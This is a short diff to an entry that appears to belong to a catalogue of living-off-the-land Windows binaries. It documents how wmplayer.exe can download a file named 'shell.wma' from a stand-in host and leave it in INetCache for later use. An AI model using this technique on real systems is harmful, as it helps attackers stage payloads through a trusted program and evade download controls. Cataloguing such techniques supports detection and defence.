@@ -4,7 +4,7 @@ Description: Windows Media Player
 Author: 'Rutger Flohil'
 Created: 2024-12-14
 Commands:
-  - Command: & "C:\Program Files (x86)\Windows Media Player\wmplayer.exe" "http://example.com/shell.wma"
+  - Command: wmplayer.exe "http://example.com/shell.wma"
     Description: Windows Media Player will download the file and attempt to play it. File should be encoded and have a compatible extension like wma. Download is stored in INetCache and needs to be cleaned before use.
     Usecase: Download file from the internet
     Category: Download
